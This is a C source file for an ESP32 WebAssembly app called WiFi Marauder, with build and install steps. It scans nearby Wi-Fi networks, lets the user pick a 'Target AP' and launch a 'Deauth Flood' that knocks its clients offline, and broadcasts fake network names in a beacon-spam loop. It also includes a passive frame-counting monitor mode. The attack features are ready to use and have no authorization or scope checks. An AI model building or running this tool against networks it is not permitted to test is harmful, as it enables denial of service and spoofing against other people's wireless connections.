// WiFi Marauder — Palanu WASM App (Plan 87 Fase 8)
//
// Native Palanu WiFi audit tool. Runs directly on the ESP32 radio —
// no external board, no UART round-trip.  Exceeds Flipper Marauder by:
//   - Real-time 802.11 frame capture (monitor ring, ~1ms latency)
//   - Live frame-type breakdown during sniff
//   - Direct raw inject via esp_wifi_80211_tx
//   - Deauth + beacon loops run firmware-native on Core 0 (timing-critical)
//   - Zero UART overhead
//
// UI: retained-mode widget system (Plan 86 Fase 3).
//   Main Menu → Scan → AP List → Attack Menu → Deauth / Beacon Spam
//                    → Monitor Mode (raw 802.11 sniff, live counts)
//                    → About
//
// Build:
//   cd examples/wifi-marauder
//   clang --target=wasm32-unknown-unknown -nostdlib -O2 \
//         -I../../packages/app-sdk/include \
//         -Wl,--no-entry -Wl,--export=main \
//         -Wl,--allow-undefined -Wl,--strip-all \
//         -o wifi-marauder.wasm main.c
//
// Install:
//   Copy manifest.json + wifi-marauder.wasm into
//   /apps/com.palanu.wifi-marauder.papp/ on the device.

#include "nema_api.h"

// ── Constants ──────────────────────────────────────────────────────────────────

#define MAX_APS       20
#define MAX_SSID_LEN  33
#define MAX_BSSID_LEN 18
#define SCAN_BUF_SZ   2048
#define FRAME_BUF_SZ  2500
#define EVENT_BUF_SZ  256

// Beacon spam SSIDs (NUL-separated — loaded from storage or these defaults)
#define DEFAULT_SPAM_COUNT 10
static const char kDefaultSpamSsids[] =
    "Free WiFi\0"
    "FBI Surveillance Van\0"
    "Not Your WiFi\0"
    "Pretty Fly for a WiFi\0"
    "Searching...\0"
    "The Internet\0"
    "Bill Wi the Science Fi\0"
    "Wu-Tang LAN\0"
    "LAN Solo\0"
    "DropItLikeItsHotspot\0";

// ── Types ──────────────────────────────────────────────────────────────────────

typedef struct {
    char bssid[MAX_BSSID_LEN];
    char ssid[MAX_SSID_LEN];
    int  channel;
    int  rssi;
    char auth[16];
} Ap;

typedef enum {
    SCR_MAIN = 0,
    SCR_SCANNING,
    SCR_AP_LIST,
    SCR_AP_DETAIL,
    SCR_ATTACK,
    SCR_DEAUTHING,
    SCR_MONITORING,
    SCR_BEACON_SPAM,
    SCR_ABOUT,
} Screen;

// 802.11 frame types for monitor breakdown
typedef struct {
    int total;
    int beacon;
    int probe;
    int deauth;
    int data;
    int other;
    int dropped;  // ring-full counter from lost frames (approx from burst gaps)
} FrameStats;

// ── Globals ────────────────────────────────────────────────────────────────────

static Ap      g_aps[MAX_APS];
static int     g_ap_count = 0;
static int     g_selected = 0;    // index of selected AP for attacks
static Screen  g_screen   = SCR_MAIN;
static int     g_mon_ch   = 1;    // monitor channel (1-13)

// ── String utilities ───────────────────────────────────────────────────────────

static int str_eq(const char* a, const char* b) {
    while (*a && *a == *b) { a++; b++; }
    return *a == *b;
}

static int str_len(const char* s) { int n=0; while(s[n]) n++; return n; }

static void str_copy(char* dst, const char* src, int max) {
    int i = 0;
    while (src[i] && i < max - 1) { dst[i] = src[i]; i++; }
    dst[i] = '\0';
}

// Append src to dst (dst has `cap` total capacity, `*used` bytes used).
static void str_append(char* dst, int cap, int* used, const char* src) {
    while (*src && *used < cap - 1) dst[(*used)++] = *src++;
    dst[*used] = '\0';
}

// Parse "num" from s, returns end pointer.
static const char* parse_int(const char* s, int* out) {
    int neg = 0, v = 0;
    if (*s == '-') { neg = 1; s++; }
    while (*s >= '0' && *s <= '9') v = v * 10 + (*s++ - '0');
    *out = neg ? -v : v;
    return s;
}

// ── Scan result parser ─────────────────────────────────────────────────────────
// Wire: "BSSID|SSID|channel|rssi|auth\n"

static int parse_scan_results(const char* buf, int len) {
    int count = 0;
    const char* p = buf;
    const char* end = buf + len;
    while (p < end && count < MAX_APS) {
        Ap* ap = &g_aps[count];
        // BSSID
        int i = 0;
        while (p < end && *p != '|' && i < MAX_BSSID_LEN - 1) ap->bssid[i++] = *p++;
        ap->bssid[i] = '\0'; if (p < end) p++;  // skip '|'
        // SSID
        i = 0;
        while (p < end && *p != '|' && i < MAX_SSID_LEN - 1) ap->ssid[i++] = *p++;
        ap->ssid[i] = '\0'; if (p < end) p++;
        // channel
        p = parse_int(p, &ap->channel); if (p < end && *p == '|') p++;
        // rssi
        p = parse_int(p, &ap->rssi); if (p < end && *p == '|') p++;
        // auth
        i = 0;
        while (p < end && *p != '\n' && i < 15) ap->auth[i++] = *p++;
        ap->auth[i] = '\0';
        if (p < end && *p == '\n') p++;
        if (ap->bssid[0]) count++;
    }
    return count;
}

// ── 802.11 frame type classifier ──────────────────────────────────────────────
// Reads the Frame Control field (bytes 0-1) to classify the frame.

static void classify_frame(const unsigned char* f, int n, FrameStats* s) {
    if (n < 2) { s->other++; return; }
    int type    = (f[0] >> 2) & 0x3;   // bits 3:2
    int subtype = (f[0] >> 4) & 0xF;   // bits 7:4
    s->total++;
    if (type == 0) {  // management
        if (subtype == 8)       s->beacon++;   // beacon
        else if (subtype == 4 ||
                 subtype == 5)  s->probe++;    // probe req/resp
        else if (subtype == 12) s->deauth++;   // deauth
        else                    s->other++;
    } else if (type == 2) {
        s->data++;
    } else {
        s->other++;
    }
}

// ── UI helpers ─────────────────────────────────────────────────────────────────

// Build a label "SSID [CH:-rssi dBm]" or "???" if no SSID.
static void ap_label(const Ap* ap, char* buf, int cap) {
    int used = 0;
    const char* ssid = ap->ssid[0] ? ap->ssid : "(hidden)";
    str_append(buf, cap, &used, ssid);
    str_append(buf, cap, &used, "  CH");
    // channel digits
    char tmp[8]; char* tp = tmp + 7; *tp = '\0';
    int ch = ap->channel;
    if (ch == 0) { *--tp = '0'; } else { while (ch) { *--tp = '0'+ch%10; ch/=10; } }
    str_append(buf, cap, &used, tp);
    str_append(buf, cap, &used, " ");
    // rssi
    int rs = ap->rssi;
    if (rs < 0) { str_append(buf, cap, &used, "-"); rs = -rs; }
    tp = tmp + 7; *tp = '\0';
    if (rs == 0) { *--tp = '0'; } else { while (rs) { *--tp = '0'+rs%10; rs/=10; } }
    str_append(buf, cap, &used, tp);
    str_append(buf, cap, &used, "dBm");
}

// Format integer into static buf and return pointer.
static const char* itoa_s(int n) {
    static char buf[16];
    char* tp = buf + 15; *tp = '\0';
    int neg = (n < 0); if (neg) n = -n;
    if (n == 0) { *--tp = '0'; } else { while (n) { *--tp = '0'+n%10; n/=10; } }
    if (neg) *--tp = '-';
    return tp;
}

// ── Screens ────────────────────────────────────────────────────────────────────

// ── Main Menu ─────────────────────────────────────────────────────────────────
#define BTN_SCAN     1
#define BTN_MONITOR  2
#define BTN_BEACON   3
#define BTN_ABOUT    4

static int screen_main(void) {
    ui_begin();
    ui_title("WiFi Marauder");
    ui_text("Palanu native WiFi audit");
    ui_button("Scan APs",    BTN_SCAN);
    ui_button("Monitor Mode",BTN_MONITOR);
    ui_button("Beacon Spam", BTN_BEACON);
    ui_button("About",       BTN_ABOUT);
    ui_end();
    return ui_wait_event();
}

// ── Scanning ──────────────────────────────────────────────────────────────────

static int screen_scanning(void) {
    // Draw "scanning" frame (no interactive buttons — scan runs on this thread).
    ui_begin();
    ui_title("Scanning...");
    ui_text("Searching for APs");
    ui_text("Please wait...");
    ui_end();

    static char scan_buf[SCAN_BUF_SZ];
    int n = wifi_scan(scan_buf, sizeof(scan_buf));
    if (n > 0) {
        g_ap_count = parse_scan_results(scan_buf, n);
    } else {
        g_ap_count = 0;
    }
    g_selected = 0;
    g_screen = SCR_AP_LIST;
    return 0;
}

// ── AP List ───────────────────────────────────────────────────────────────────
// Each AP is a button. Focus navigation moves between them.

static int screen_ap_list(void) {
    char label[64];
    ui_begin();
    ui_title("Scan Results");
    if (g_ap_count == 0) {
        ui_text("No APs found");
        ui_text("Try scanning again");
        ui_button("< Back", 99);
        ui_end();
        int ev = ui_wait_event();
        if (ev == EV_BACK || ev == 99) g_screen = SCR_MAIN;
        return ev;
    }
    char hdr[32] = "Found ";
    int used = 6;
    str_append(hdr, sizeof(hdr), &used, itoa_s(g_ap_count));
    str_append(hdr, sizeof(hdr), &used, " APs:");
    ui_text(hdr);
    for (int i = 0; i < g_ap_count; i++) {
        ap_label(&g_aps[i], label, sizeof(label));
        ui_button(label, i + 1);  // button ids 1..g_ap_count
    }
    ui_button("< Back", 99);
    ui_end();

    int ev = ui_wait_event();
    if (ev == EV_BACK || ev == 99) {
        g_screen = SCR_MAIN;
    } else if (ev >= 1 && ev <= g_ap_count) {
        g_selected = ev - 1;
        g_screen   = SCR_AP_DETAIL;
    }
    return ev;
}

// ── AP Detail ─────────────────────────────────────────────────────────────────
#define BTN_DEAUTH  1
#define BTN_BACK_D  2

static int screen_ap_detail(void) {
    const Ap* ap = &g_aps[g_selected];
    ui_begin();
    ui_title("Target AP");
    ui_text(ap->ssid[0] ? ap->ssid : "(hidden)");
    ui_text(ap->bssid);
    {
        char line[32] = "CH: ";
        int used = 4;
        str_append(line, sizeof(line), &used, itoa_s(ap->channel));
        str_append(line, sizeof(line), &used, "   RSSI: ");
        str_append(line, sizeof(line), &used, itoa_s(ap->rssi));
        str_append(line, sizeof(line), &used, "dBm");
        ui_text(line);
    }
    {
        char line[24] = "Auth: ";
        int used = 6;
        str_append(line, sizeof(line), &used, ap->auth);
        ui_text(line);
    }
    ui_button("Deauth Flood", BTN_DEAUTH);
    ui_button("< Back",       BTN_BACK_D);
    ui_end();

    int ev = ui_wait_event();
    if (ev == EV_BACK || ev == BTN_BACK_D) {
        g_screen = SCR_AP_LIST;
    } else if (ev == BTN_DEAUTH) {
        g_screen = SCR_DEAUTHING;
    }
    return ev;
}

// ── Deauth Flood ──────────────────────────────────────────────────────────────
// Loop runs firmware-native on Core 0.  WASM receives events and shows live
// feedback.  Press any button / Back to stop.

static void screen_deauthing(void) {
    const Ap* ap = &g_aps[g_selected];
    int started = (wifi_deauth_start(ap->bssid, ap->channel) == 0);

    int packets = 0;
    char ev_buf[EVENT_BUF_SZ];

    while (1) {
        // Poll for firmware events (deauth sent tick).
        int n = wifi_wait_event(ev_buf, sizeof(ev_buf), 100);
        if (n > 0) packets++;  // each event = one deauth burst

        // Rebuild UI with live count.
        ui_begin();
        ui_title("Deauthing...");
        if (!started) {
            ui_text("Not supported");
        } else {
            char line[40] = "Target: ";
            int used = 8;
            str_append(line, sizeof(line), &used, ap->ssid[0] ? ap->ssid : ap->bssid);
            ui_text(line);
            char cnt[24] = "Deauths: ";
            used = 9;
            str_append(cnt, sizeof(cnt), &used, itoa_s(packets));
            ui_text(cnt);
        }
        ui_button("Stop", 1);
        ui_end();

        int key = ui_poll_event();
        if (key == EV_BACK || key == 1) break;
    }

    wifi_deauth_stop();
    g_screen = SCR_AP_DETAIL;
}

// ── Monitor Mode ──────────────────────────────────────────────────────────────
// Opens promiscuous mode, reads raw 802.11 frames, classifies by type, shows
// live counters.  Press any button / Back to stop.

#define BTN_CH_UP   1
#define BTN_CH_DOWN 2
#define BTN_STOP_M  3

static void screen_monitoring(void) {
    g_mon_ch = 1;
    int open = (wifi_monitor_open(g_mon_ch) == 0);
    FrameStats stats;
    stats.total=0; stats.beacon=0; stats.probe=0;
    stats.deauth=0; stats.data=0; stats.other=0; stats.dropped=0;

    static unsigned char frame_buf[FRAME_BUF_SZ];

    while (1) {
        // Read up to one frame per iteration (50ms timeout).
        if (open) {
            int n = wifi_monitor_read(frame_buf, sizeof(frame_buf), 50);
            if (n > 0) {
                classify_frame(frame_buf, n, &stats);
            }
        }

        // Draw live stats.
        ui_begin();
        {
            char hdr[24] = "Monitor  CH";
            int used = 11;
            str_append(hdr, sizeof(hdr), &used, itoa_s(g_mon_ch));
            ui_title(hdr);
        }
        if (!open) {
            ui_text("Not supported on this board");
        } else {
            char line[32];
            int used;
#define STAT_ROW(lbl, val) do { \
    used = 0; str_append(line, sizeof(line), &used, lbl); \
    str_append(line, sizeof(line), &used, itoa_s(val)); \
    ui_text(line); } while(0)
            STAT_ROW("Total:   ", stats.total);
            STAT_ROW("Beacon:  ", stats.beacon);
            STAT_ROW("Probe:   ", stats.probe);
            STAT_ROW("Deauth:  ", stats.deauth);
            STAT_ROW("Data:    ", stats.data);
            STAT_ROW("Other:   ", stats.other);
#undef STAT_ROW
        }
        ui_row_begin();
        ui_button("CH+", BTN_CH_UP);
        ui_button("CH-", BTN_CH_DOWN);
        ui_row_end();
        ui_button("Stop",  BTN_STOP_M);
        ui_end();

        int ev = ui_poll_event();
        if (ev == EV_BACK || ev == BTN_STOP_M) break;
        if (ev == BTN_CH_UP && g_mon_ch < 13) {
            g_mon_ch++;
            if (open) { wifi_monitor_close(); open = (wifi_monitor_open(g_mon_ch) == 0); }
        } else if (ev == BTN_CH_DOWN && g_mon_ch > 1) {
            g_mon_ch--;
            if (open) { wifi_monitor_close(); open = (wifi_monitor_open(g_mon_ch) == 0); }
        }
    }

    if (open) wifi_monitor_close();
    g_screen = SCR_MAIN;
}

// ── Beacon Spam ───────────────────────────────────────────────────────────────
// Broadcasts random fake SSIDs in a firmware-native loop on Core 0.
// Custom SSID list can be stored in "spam_ssids.txt" (NUL-separated).

static void screen_beacon_spam(void) {
    // Try to load custom SSIDs from storage.
    static char custom_buf[512];
    int custom_count = 0;
    int n = nema_storage_fs_read_file("spam_ssids.txt", custom_buf, sizeof(custom_buf) - 1);
    if (n > 0) {
        // Count NUL separators.
        for (int i = 0; i < n; i++) if (custom_buf[i] == '\0') custom_count++;
        if (custom_buf[n-1] != '\0') { custom_buf[n] = '\0'; custom_count++; }
    }
    const char* ssids_buf = (custom_count > 0) ? custom_buf : kDefaultSpamSsids;
    int ssids_count       = (custom_count > 0) ? custom_count : DEFAULT_SPAM_COUNT;

    int started = (wifi_beacon_spam_start(ssids_buf, ssids_count) == 0);
    int ticks = 0;
    char ev_buf[EVENT_BUF_SZ];

    while (1) {
        int ev_n = wifi_wait_event(ev_buf, sizeof(ev_buf), 200);
        if (ev_n > 0) ticks++;

        ui_begin();
        ui_title("Beacon Spam");
        if (!started) {
            ui_text("Not supported on this board");
        } else {
            char line[32] = "SSIDs: ";
            int used = 7;
            str_append(line, sizeof(line), &used, itoa_s(ssids_count));
            ui_text(line);
            char cnt[32] = "Ticks: ";
            used = 7;
            str_append(cnt, sizeof(cnt), &used, itoa_s(ticks));
            ui_text(cnt);
            ui_text("Spamming all channels");
        }
        ui_button("Stop", 1);
        ui_end();

        int key = ui_poll_event();
        if (key == EV_BACK || key == 1) break;
    }

    wifi_beacon_spam_stop();
    g_screen = SCR_MAIN;
}

// ── About ─────────────────────────────────────────────────────────────────────

static int screen_about(void) {
    ui_begin();
    ui_title("WiFi Marauder");
    ui_text("v1.0.0 — Palanu WASM");
    ui_text("Native ESP32 radio");
    ui_text("No external board needed");
    ui_text("");
    ui_text("Features:");
    ui_text("  AP Scan + Target Select");
    ui_text("  Deauth Flood (Core 0)");
    ui_text("  Monitor Mode + Frame Stats");
    ui_text("  Beacon Spam (Core 0)");
    ui_text("");
    ui_text("Inspired by Flipper Zero");
    ui_text("ESP32 Marauder by");
    ui_text("justcallmekoko");
    ui_button("Back", 1);
    ui_end();
    int ev = ui_wait_event();
    if (ev == EV_BACK || ev == 1) g_screen = SCR_MAIN;
    return ev;
}

// ── Entry point ────────────────────────────────────────────────────────────────

NEMA_EXPORT int main(void) {
    nema_log("info", "WiFiMarauder", "started");
    g_screen = SCR_MAIN;

    while (1) {
        switch (g_screen) {
            case SCR_MAIN: {
                int ev = screen_main();
                if (ev == EV_BACK)    return 0;
                if (ev == BTN_SCAN)   g_screen = SCR_SCANNING;
                if (ev == BTN_MONITOR)g_screen = SCR_MONITORING;
                if (ev == BTN_BEACON) g_screen = SCR_BEACON_SPAM;
                if (ev == BTN_ABOUT)  g_screen = SCR_ABOUT;
                break;
            }
            case SCR_SCANNING:
                screen_scanning();
                break;
            case SCR_AP_LIST:
                screen_ap_list();
                break;
            case SCR_AP_DETAIL:
                screen_ap_detail();
                break;
            case SCR_DEAUTHING:
                screen_deauthing();
                break;
            case SCR_MONITORING:
                screen_monitoring();
                break;
            case SCR_BEACON_SPAM:
                screen_beacon_spam();
                break;
            case SCR_ABOUT:
                screen_about();
                break;
            default:
                g_screen = SCR_MAIN;
                break;
        }
    }
}
